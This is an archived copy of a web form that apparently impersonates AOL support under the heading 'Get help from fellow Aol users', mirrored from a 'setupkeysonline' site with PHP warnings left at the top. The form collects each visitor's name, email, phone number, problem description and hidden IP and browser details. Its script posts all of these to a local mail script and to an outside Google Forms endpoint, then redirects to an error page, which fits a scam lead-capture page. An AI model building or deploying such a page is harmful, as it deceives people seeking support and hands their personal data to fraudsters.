<br />
<b>Warning</b>:  Undefined variable $ub in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/form.php</b> on line <b>64</b><br />
<br />
<b>Warning</b>:  Undefined variable $ub in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/form.php</b> on line <b>76</b><br />
<br />
<b>Deprecated</b>:  strripos(): Passing null to parameter #2 ($needle) of type string is deprecated in <b>/srv/users/setupkeysonlinesite/apps/setupkeysonlinesite/public/alog/1/form.php</b> on line <b>76</b><br />
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from setupkeysonline.site/alog/1/form.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Jun 2024 20:32:48 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Email</title>
    <link rel="stylesheet" href="../../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="../../../ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="../../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Lato:300&amp;display=swap" rel="stylesheet">
	
	<link rel="stylesheet" href="css/err.css">
    <style>
        body
        {
            background:#fff;
        }
    </style>
</head>
<body>
    <div class="email-nav">
        <div class="container-fluid">
            <img src="img/logo.png" alt="" class="emai-log">
        </div>
    </div>
    <h1 class="text-center emai-heading">Get help from fellow Aol users</h1>
    <div class="container-fluid">
        <div class="col-lg-6 col-md-6 col-sm-8 col-lg-offset-3  col-md-offset-3 col-sm-offset-2">
        <form id="form" target="_self" onsubmit="return postToGoogle();" action="#" autocomplete="off">
            <hr>
            <div class="col-lg-12">
                <p class="plac-tet-email">Contact Details</p>
                <input type="text"  name="entry.2005620554" id="nameField" class="email-inpt-back" placeholder="Full Name (required)" required>
                <input type="hidden"  id="ipField" name="entry.163099810" value="194.61.40.17" class="email-inpt-back" placeholder="Full Name (required)">
                <input type="hidden" id="osField" name="entry.1430912153" value="" class="email-inpt-back" placeholder="Full Name (required)">
                <input type="hidden" id="browserField" name="entry.1332621263" value="Unknown 4.5" class="email-inpt-back" placeholder="Full Name (required)">
            </div>
            <div class="col-lg-12">
                <input type="email" name="entry.1045781291" id="emailField" class="email-inpt-back" placeholder=" Email Address (required)" required>
            </div>
            <div class="col-lg-12">
                <input type="text" id="mobField" name="entry.1065046570" class="email-inpt-back" placeholder="Phone Number (required)" required>
            </div>
            <div class="col-lg-12">
                <p class="plac-tet-email1">Problem/Question</p>
                <textarea name="entry.1166974658" id="quesField" rows="7" class="email-inpt-back1" placeholder="Please provide a detailed description of your problem/question (required)" required></textarea>
            </div>
            <div class="col-lg-12">
                <input type="submit" value="Submit" class="email-inpt-back2">
            </div>
        </div>
        </form>
    </div>
<script>
$("#form").submit(function()
{
    var field1 = $("#nameField").val();
    var field2 = $("#emailField").val();
    var field3 = $("#mobField").val();
    var field5 = $("#quesField").val();
    var field6 = $("#ipField").val();
    var field7 = $("#osField").val();
    var field8 = $("#browserField").val();
    $.ajax({
      url:"mail1.php",
      type:"POST",
      data:{"email": field2,"name": field1,"mobno":field3, "question": field5, "ip": field6, "os": field7, "browser": field8 },
      success: function(data)
      {
        return true
      },
    });
    return false
    e.preventDefault();
});

        function pageRedirect() {
                     window.location.replace("err.html");
                        }   
    function postToGoogle() {
           var field1 = $("#nameField").val();
           var field2 = $("#emailField").val();
           var field3 = $("#mobField").val();
           var field5 = $("#quesField").val();
           var field6 = $("#ipField").val();
           var field7 = $("#osField").val();
           var field8 = $("#browserField").val();
           
           $.ajax({
               url: "https://docs.google.com/forms/d/e/1FAIpQLSd9SCMwmQOwYkRS0RebSCpIvx0tSUUpb5_Zm0DEQRDh0pYlkA/formResponse",
			data: {"entry.2005620554": field1, "entry.1045781291": field2, "entry.1065046570": field3, "entry.1166974658": field5, "entry.1891369240": field6, "entry.419529782": field7, "entry.1839601832": field8},
               type: "POST",
               dataType: "xml",
               success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("pageRedirect()", 100);
				}
           });
		return false;
       }

</script>

</body>

<!-- Mirrored from setupkeysonline.site/alog/1/form.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Jun 2024 20:32:48 GMT -->
</html>